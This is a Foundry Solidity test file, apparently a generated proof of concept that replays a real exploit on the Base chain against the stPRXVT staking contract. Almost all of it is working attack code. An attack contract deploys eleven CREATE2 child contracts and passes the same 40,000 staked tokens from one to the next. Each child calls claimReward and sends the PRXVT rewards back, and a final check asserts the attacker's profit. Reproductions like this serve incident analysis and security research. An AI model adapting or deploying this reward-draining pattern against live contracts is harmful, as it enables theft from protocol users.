// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x7407f9bdc4140d5e284ea7de32a9de6037842f45
// Attack Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
// Vulnerable Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
// Attack Tx : 0xf42a8fe556d5e4ab59b0b7675ccbcd1425e7e2a6a8e0c9775fc6cd7c48ff55a1
// Block : 40230107
// Chain : Base
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 40230106;
    uint256 constant TX_TIMESTAMP = 1767249561;
    uint256 constant TX_BLOCK_NUMBER = 40230107;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function executeAttack(AttackContract attack) internal {
        bytes memory entryData = abi.encodeWithSelector(
            bytes4(0xe6d7db7e), uint256(0x00000000000000000000000000000000000000000000000000000000000927c0)
        );
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
    }

    function _deployAttack() internal returns (AttackContract attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = AttackContract(payable(ATTACK_CONTRACT));
        } else {
            attack = new AttackContract();
        }
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(AttackContract attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _etchRuntime() internal {
        // Exact-address fallback for CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.PRXVT, "PRXVT", 1968873386914157328000);
    }
}

contract AttackContract {
    AttackChild public attackChild;

    AttackChild public attackChild_1;
    AttackChild public attackChild_2;
    AttackChild public attackChild_3;
    AttackChild public attackChild_4;
    AttackChild public attackChild_5;
    AttackChild public attackChild_6;
    AttackChild public attackChild_7;
    AttackChild public attackChild_8;
    AttackChild public attackChild_9;
    AttackChild public attackChild_10;

    function attack() public payable {
        _deployAttackChild();
    }

    function _deployAttackChild() internal {
        _replayProtocolCalls();
        bytes32 createSalt3 = bytes32(uint256(3));
        attackChild = new AttackChild{salt: createSalt3}();
        attackChild._prepareAttackChild();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt4 = bytes32(uint256(4));
        attackChild_3 = new AttackChild{salt: createSalt4}();
        attackChild_3._prepareAttackChild4();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_3), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_3)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt5 = bytes32(uint256(5));
        attackChild_6 = new AttackChild{salt: createSalt5}();
        attackChild_6._prepareAttackChild7();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_6), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_6)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt6 = bytes32(uint256(6));
        attackChild_1 = new AttackChild{salt: createSalt6}();
        attackChild_1._prepareAttackChild2();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_1), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_1)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt7 = bytes32(uint256(7));
        attackChild_10 = new AttackChild{salt: createSalt7}();
        attackChild_10._prepareAttackChil2();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_10), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_10)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt8 = bytes32(uint256(8));
        attackChild_2 = new AttackChild{salt: createSalt8}();
        attackChild_2._prepareAttackChild3();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_2), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_2)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt9 = bytes32(uint256(9));
        attackChild_4 = new AttackChild{salt: createSalt9}();
        attackChild_4._prepareAttackChild5();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_4), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_4)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt10 = bytes32(uint256(10));
        attackChild_7 = new AttackChild{salt: createSalt10}();
        attackChild_7._prepareAttackChild8();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_7), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_7)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
    }

    function _replayProtocolCalls() internal {
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt0 = bytes32(uint256(0));
        attackChild_9 = new AttackChild{salt: createSalt0}();
        attackChild_9._prepareAttackChild1();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_9), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_9)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt1 = bytes32(uint256(1));
        attackChild_5 = new AttackChild{salt: createSalt1}();
        attackChild_5._prepareAttackChild6();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_5), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_5)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        bytes32 createSalt2 = bytes32(uint256(2));
        attackChild_8 = new AttackChild{salt: createSalt2}();
        attackChild_8._prepareAttackChild9();
        IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_8), 40000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        AttackChild(payable(address(attackChild_8)))
            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xe6d7db7e) {
            attack();
            return;
        }
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    receive() external payable {}

    function execute(address stakingToken, address profitToken, address recipient) external payable {
        stakingToken;
        profitToken;
        recipient;
        _claimRewards();
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function attackChildCb10() external payable {
        _claimRewards();
    }

    function attackChildCb6() external payable {
        _claimRewards();
    }

    function attackChildCb9() external payable {
        _claimRewards();
    }

    function attackChildCb() external payable {
        _claimRewards();
    }

    function attackChildCb4() external payable {
        _claimRewards();
    }

    function attackChildCb7() external payable {
        _claimRewards();
    }

    function attackChildCb2() external payable {
        _claimRewards();
    }

    function attackChildCb11() external payable {
        _claimRewards();
    }

    function attackChildCb3() external payable {
        _claimRewards();
    }

    function attackChildCb5() external payable {
        _claimRewards();
    }

    function attackChildCb8() external payable {
        _claimRewards();
    }

    function _prepareAttackChild() public {}

    function _prepareAttackChild2() public {}

    function _prepareAttackChild3() public {}

    function _prepareAttackChild4() public {}

    function _prepareAttackChild5() public {}

    function _prepareAttackChild6() public {}

    function _prepareAttackChild7() public {}

    function _prepareAttackChild8() public {}

    function _prepareAttackChild9() public {}

    function _prepareAttackChild1() public {}

    function _prepareAttackChil2() public {}

    function _claimRewards() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        uint256 stakingTokenAmount = IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, stakingTokenAmount);
        uint256 profitTokenAmount = IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, profitTokenAmount);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant attack_child = 0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242;
    address internal constant attack_child_21A6 = 0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6;
    address internal constant attack_child_7D8E = 0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e;
    address internal constant attack_child_F368 = 0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368;
    address internal constant attack_contract = 0x702980b1Ed754C214B79192a4D7c39106f19BcE9;
    address internal constant attack_child_38A8 = 0x72CDfF23dB035D4959901158d230c0c8642a38a8;
    address internal constant attacker_eoa = 0x7407f9bdc4140d5e284ea7De32A9De6037842f45;
    address internal constant AgentTokenV2 = 0x7BaB5D2e3EbdE7293888B3f4c022aAAAD88Ae2db;
    address internal constant attack_child_8466 = 0x8D7bf27794B53129a143b120B1852Fe3048E8466;
    address internal constant attack_child_960D = 0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d;
    address internal constant attack_child_5349 = 0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349;
    address internal constant attack_child_B5EB = 0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant PRXVT = 0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0;
    address internal constant attack_child_BD4E = 0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E;
    address internal constant stPRXVT = 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff;
    address internal constant attack_child_F4AD = 0xEA6E0B9f162E5532389f32832529a794bf10F4AD;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IstPRXVT {
    function claimReward() external;
    function earned(address) external view returns (uint256);
}
